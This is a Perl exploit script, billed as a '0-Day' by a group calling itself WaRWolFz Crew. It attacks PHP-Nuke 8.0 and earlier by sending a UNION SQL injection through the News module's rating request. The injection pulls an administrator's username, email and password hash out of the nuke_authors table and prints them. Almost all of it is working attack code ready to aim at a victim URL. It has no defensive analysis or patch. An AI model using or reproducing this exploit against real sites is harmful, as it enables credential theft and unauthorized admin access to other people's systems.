#!/usr/bin/perl
#[0-Day] PHP-Nuke <= 8.0 (News) Remote SQL Injection Exploit
#Created: 2010.04.23 after 3 days the bug was discovered.
#Author/s: Dante90 & The:Paradox, WaRWolFz Crew
#Crew Members: 4lasthor, Andryxxx, Cod3, Gho5t, HeRtZ, N.o.3.X, RingZero, s3rg3770, Shades Master, The:Paradox, V1R5, yeat
#Web Site: www.warwolfz.org

use strict;
use warnings;

use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Headers;

my $UserName = shift or usage();
my $HostName = "http://www.victime_site.org/path/"; #Insert Victime Web Site
Link

my $Method = HTTP::Request->new(POST => $HostName.'modules.php?name=News');
my $Cookies = new HTTP::Cookies;
my $UserAgent = new LWP::UserAgent(
agent => 'Mozilla/5.0',
max_redirect => 0,
cookie_jar => $Cookies,
default_headers => HTTP::Headers->new,
) or die $!;
my $Referrer = "sid=Dante90, WaRWolFz Crew
http://www.warwolfz.org/&op=rate_complete&score=1";

sub SQL_Injection{
my ($Victime) = @_;
return "-2' UNION#\n SELECT
CONCAT_WS(CHAR(32,58,32),`aid`,`name`,`email`,`pwd`) FROM `nuke_authors`
WHERE `aid`='${Victime}'-- ";
}

$Method->referer($HostName.'modules.php?name=News');
$Method->content_type('application/x-www-form-urlencoded');
$Method->content("sid=".SQL_Injection($UserName)."&op=rate_complete&score=1");
my $Response = $UserAgent->request($Method);
$Response->is_success or die "$HostName : ",$Response->message,"\n";

if($Response->content =~ /([a-zA-Z0-9-_.]{2,15}) : ([a-zA-Z0-9-_.]{2,15}) :
([a-zA-Z0-9.@]{1,50}) : ([a-f0-9]{32})/i){
refresh($HostName, $1, $2, $3, $4);
print " * Exploit Successfully Executed *\n";
print " ------------------------------------------------------\n\n";
system("pause");
}else{
refresh($HostName, "", "", "", "");
print " * Error extracting sensible data.\n";
print " * Exploit Failed *\n";
print " ------------------------------------------------------ \n\n";
}


sub usage{
system("cls");
{
print " \n [0-Day] PHP-Nuke <= 8.0 (News) Remote SQL Injection
Exploit\n";
print " ------------------------------------------------------ \n";
print " * USAGE: *\n";
print " * cd [Local Disk]:\\[Directory Of Exploit]\\ *\n";
print " * perl name_exploit.pl [username] *\n";
print " ------------------------------------------------------ \n";
print " * Powered By Dante90 & The:Paradox, WaRWolFz Crew *\n";
print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
print " ------------------------------------------------------ \n";
};
exit;
}

sub refresh{
system("cls");
{
print " \n [0-Day] PHP-Nuke <= 8.0 (News) Remote SQL Injection
Exploit\n";
print " ------------------------------------------------------ \n";
print " * USAGE: *\n";
print " * cd [Local Disk]:\\[Directory Of Exploit]\\ *\n";
print " * perl name_exploit.pl [username] *\n";
print " ------------------------------------------------------ \n";
print " * Powered By Dante90 & The:Paradox, WaRWolFz Crew *\n";
print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
print " ------------------------------------------------------ \n";
};
print " * Victime Site: " . $_[0] . "\n";
print " * User ID: " . $_[1] . "\n";
print " * Username: " . $_[2] . "\n";
print " * Password: " . $_[4] . "\n";
print " * E-Mail: " . $_[3] . "\n";
}

#WaRWolFz Crew